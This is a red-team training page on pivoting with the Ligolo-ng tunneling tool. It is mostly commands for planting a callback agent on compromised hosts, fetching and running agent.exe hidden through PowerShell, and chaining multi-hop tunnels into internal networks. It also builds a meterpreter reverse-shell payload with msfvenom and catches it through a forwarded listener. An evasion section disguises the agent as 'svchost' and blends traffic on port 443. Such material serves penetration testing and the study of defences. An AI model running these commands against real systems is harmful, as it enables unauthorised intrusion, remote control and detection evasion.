---
layout: training-page
title: "Ligolo-ng — Red Team Academy"
module: "Pivoting & Tunneling"
tags:
  - ligolo-ng
  - tun-interface
  - pivoting
  - transparent-proxy
page_key: "pivoting-ligolo-ng"
render_with_liquid: false
---

# Ligolo-ng

## Overview

Ligolo-ng is a modern, actively maintained pivoting tool by Nicolas Chatelain that creates a real TUN network interface on your attack box. Unlike SOCKS-based pivoting (Chisel, SSH -D), ligolo-ng routes traffic at the OS level — all tools work natively without proxychains configuration. ICMP, UDP, and TCP all tunnel transparently.

Architecture: two binaries — `proxy` runs on your attack box and manages TUN interfaces; `agent` runs on the pivot host and connects back to the proxy over TLS.

Repository: https://github.com/nicocha30/ligolo-ng

![Ligolo-ng TUN interface pivot: agent on pivot connects outbound to proxy on attack box, OS-level TUN routing forwards all traffic natively without proxychains](/images/pivoting/ligolo-ng-arch.svg)  
*// ligolo-ng — tun-based transparent pivot, no proxychains required*

## Installation

```bash
# Download pre-built binaries from GitHub releases:
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz

# Extract:
tar -xzf ligolo-ng_proxy_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_linux_amd64.tar.gz

# Windows agent (for Windows pivot hosts):
# Download: ligolo-ng_agent_windows_amd64.zip
# Unzip and serve via HTTP

# Build from source (requires Go 1.20+):
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng
go build -o proxy cmd/proxy/main.go
go build -o agent cmd/agent/main.go

# Cross-compile Windows agent from Linux:
GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go
```

## Attacker Setup (proxy)

The proxy binary runs on your attack box and manages the TUN interface that all traffic routes through.

```bash
# Step 1: Create a TUN interface (requires root):
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Verify the interface was created:
ip link show ligolo
# 4: ligolo: <POINTOPOINT,MULTICAST,NOARP> mtu 1500 ...

# Step 2: Start the proxy — listen for incoming agent connections:
./proxy -selfcert -laddr 0.0.0.0:11601
# -selfcert: generate a self-signed TLS certificate automatically
# -laddr: address and port for agents to connect to
# Use a custom port if 11601 conflicts or is blocked:
./proxy -selfcert -laddr 0.0.0.0:443

# Step 3: Proxy console is now open:
# INFO[0000] Listening on 0.0.0.0:11601
# ligolo-ng »

# Use your own certificate (more OPSEC-friendly):
openssl req -x509 -newkey rsa:4096 -keyout proxy.key -out proxy.crt -days 365 -nodes \
    -subj "/C=US/O=Corp/CN=update.contoso.com"
./proxy -certfile proxy.crt -keyfile proxy.key -laddr 0.0.0.0:11601
```

## Agent Deployment (pivot host)

The agent binary runs on the compromised pivot host and connects back to the proxy.

```bash
# ── Linux agent ───────────────────────────────────────────────
./agent -connect attacker_ip:11601 -ignore-cert
# -connect: proxy address and port
# -ignore-cert: accept the self-signed certificate

# Run in background:
nohup ./agent -connect 10.10.14.5:11601 -ignore-cert &

# ── Windows agent (PowerShell download + exec) ─────────────────
# Serve the agent from attack box:
python3 -m http.server 8000

# Download and execute on Windows pivot:
Invoke-WebRequest -Uri "http://10.10.14.5:8000/agent.exe" -OutFile "C:\Windows\Temp\agent.exe"
C:\Windows\Temp\agent.exe -connect 10.10.14.5:11601 -ignore-cert

# Run hidden (no console window):
Start-Process -FilePath "C:\Windows\Temp\agent.exe" `
    -ArgumentList "-connect 10.10.14.5:11601 -ignore-cert" `
    -WindowStyle Hidden

# ── Verify connection on proxy ────────────────────────────────
# In the proxy console, you should see:
# INFO[XXXX] Agent joined. name=HOSTNAME remote="10.129.202.64:PORT"
ligolo-ng » session
# Num  Agent                  Remote Address
#   1  ubuntu@pivot-host      10.129.202.64:54321
```

## Creating a Tunnel

Once an agent connects, select the session and configure routing.

```bash
# In the proxy console — list sessions:
ligolo-ng » session

# Select a session by number:
ligolo-ng » 1
# [Agent : ubuntu@pivot-host] »

# Step 1: On your attack box shell (separate terminal) — add route for target subnet:
sudo ip route add 172.16.5.0/24 dev ligolo

# Verify the route:
ip route show | grep ligolo
# 172.16.5.0/24 dev ligolo scope link

# Step 2: Start the tunnel in the proxy console:
[Agent : ubuntu@pivot-host] » start
# INFO[XXXX] Starting tunnel to ubuntu@pivot-host

# Step 3: Test connectivity (no proxychains needed):
ping 172.16.5.19
nmap -sV -p 22,80,443,445,3389,5985 172.16.5.19
evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!'
crackmapexec smb 172.16.5.0/24

# Stop the tunnel:
[Agent : ubuntu@pivot-host] » stop

# Clean up route when done:
sudo ip route del 172.16.5.0/24 dev ligolo
```

## Multi-Hop Pivoting

Chain two agents to reach a third network segment. Each hop requires its own TUN interface.

```bash
# Network topology:
# AttackBox → Pivot1 (192.168.1.50) → Pivot2 (172.16.5.19) → Target (10.10.10.0/24)

# ── Step 1: Connect Pivot1 agent ──────────────────────────────
# On Pivot1:
./agent -connect ATTACKER:11601 -ignore-cert

# In proxy console:
ligolo-ng » session
# [1] ubuntu@pivot1

# Add route to Pivot1's network and start:
sudo ip route add 172.16.5.0/24 dev ligolo
ligolo-ng » 1
[Agent : ubuntu@pivot1] » start

# ── Step 2: Create second TUN interface for second hop ─────────
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# ── Step 3: Deploy agent on Pivot2 (through the first tunnel) ──
# From attack box (now directly reachable via TUN):
scp agent ubuntu@172.16.5.19:/tmp/
ssh ubuntu@172.16.5.19 "nohup /tmp/agent -connect ATTACKER:11601 -ignore-cert &"

# Pivot2 agent connects to the same proxy listener

# ── Step 4: Select Pivot2 session and add second hop route ─────
ligolo-ng » session
# [1] ubuntu@pivot1
# [2] ubuntu@pivot2

# Add route to the deeper network through the second TUN:
sudo ip route add 10.10.10.0/24 dev ligolo2

# Start second tunnel on the second TUN interface:
ligolo-ng » 2
[Agent : ubuntu@pivot2] » start --tun ligolo2

# Now attack box can reach 10.10.10.0/24 natively through Pivot1 → Pivot2
nmap -sV 10.10.10.100
```

## Listening on Agent (Reverse Port Forward)

Create a listener on the agent host that forwards connections back to the attack box. Useful for catching reverse shells from hosts that can only reach the pivot.

```bash
# Scenario: internal host 172.16.5.25 needs to callback to attack box :4444
# The internal host can reach Pivot1 but not the attack box directly.

# In proxy console — add a listener on the agent:
[Agent : ubuntu@pivot1] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 --tcp
# Agent will listen on :1234
# Any connection to pivot1:1234 → forwarded to attack box localhost:4444

# Start the listener:
# (It activates immediately after listener_add)

# List active listeners:
[Agent : ubuntu@pivot1] » listener_list

# On attack box — start the handler:
nc -lvnp 4444
# Or MSF handler:
# use exploit/multi/handler
# set LHOST 0.0.0.0
# set LPORT 4444
# run

# Create payload pointing to pivot1 IP:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=172.16.5.129 LPORT=1234 \
    -f exe -o shell.exe
# Execute on 172.16.5.25 → connects to pivot1:1234 → attack box:4444

# Remove a listener:
[Agent : ubuntu@pivot1] » listener_del --id 0
```

## Why Ligolo-ng over Chisel/SOCKS

```
# SOCKS-based pivoting (Chisel, SSH -D):
# - Requires proxychains wrapping every tool
# - TCP only by default (ICMP/UDP don't work)
# - Some tools bypass SOCKS (native socket calls)
# - DNS leaks unless proxy_dns is set
# - Overhead: every connection goes through SOCKS negotiation

# Ligolo-ng (TUN-based):
# + No proxychains — all tools work natively (nmap, ping, impacket, etc.)
# + ICMP tunnels — can ping internal hosts
# + UDP support — DNS, SNMP, and UDP-based protocols work
# + Lower overhead — TUN routing is OS-level, not userspace SOCKS
# + Stable under load — tested with parallel heavy scans
# + Multi-hop via multiple TUN interfaces

# When to prefer Chisel:
# - No root on attack box (can't create TUN)
# - Need to route through an HTTP/HTTPS corporate proxy
# - Quick one-off tunnel where setup speed matters
# - Windows-only attack box without TUN support

# When to prefer Ligolo-ng:
# - Full tool compatibility required (Impacket, Responder, nmap SYN scan)
# - Need ICMP or UDP
# - Sustained operations requiring stability
# - Multi-hop scenarios needing clean routing
```

## Detection Context

Understanding what artifacts ligolo-ng leaves helps anticipate blue team detection.

```bash
# Artifacts on the attack box:
# - TUN interface creation: visible in ip link show, audit logs
#   auditd rule would flag: ip tuntap add
# - Custom routing entries: ip route show
# - Outbound TLS connection from proxy binary to pivot

# Artifacts on the pivot host (agent):
# - Outbound connection from agent process to attacker_ip:11601
#   Visible in: netstat -anp, ss -anp, /proc/net/tcp
# - Process named "agent" or whatever you renamed it to
#   Visible in: ps aux, /proc/<pid>/cmdline
# - If downloaded: HTTP request for agent binary in web server logs

# Network-level detection:
# - TLS connection from internal host to an external IP on a non-standard port
# - Long-lived persistent TLS session (not typical for workloads)
# - Traffic volume patterns inconsistent with the host's normal behavior
# - Port 11601 is the default — change with -laddr to blend (use 443, 8443)

# OPSEC hardening:
# Rename agent binary:
cp agent /tmp/svchost && chmod +x /tmp/svchost
/tmp/svchost -connect attacker:443 -ignore-cert

# Use legitimate-looking port:
./proxy -selfcert -laddr 0.0.0.0:443

# Use a real certificate signed by a trusted CA or Let's Encrypt:
./proxy -certfile /etc/letsencrypt/live/domain/fullchain.pem \
        -keyfile /etc/letsencrypt/live/domain/privkey.pem \
        -laddr 0.0.0.0:443

# Clean up after use:
sudo ip route del 172.16.5.0/24 dev ligolo
sudo ip link set ligolo down
sudo ip tuntap del mode tun ligolo
rm /tmp/agent
```

## Resources

- Ligolo-ng — https://github.com/nicocha30/ligolo-ng
- Ligolo-ng wiki — https://github.com/nicocha30/ligolo-ng/wiki
- MITRE T1572 — Protocol Tunneling
- MITRE T1090 — Proxy
- MITRE T1090.001 — Internal Proxy
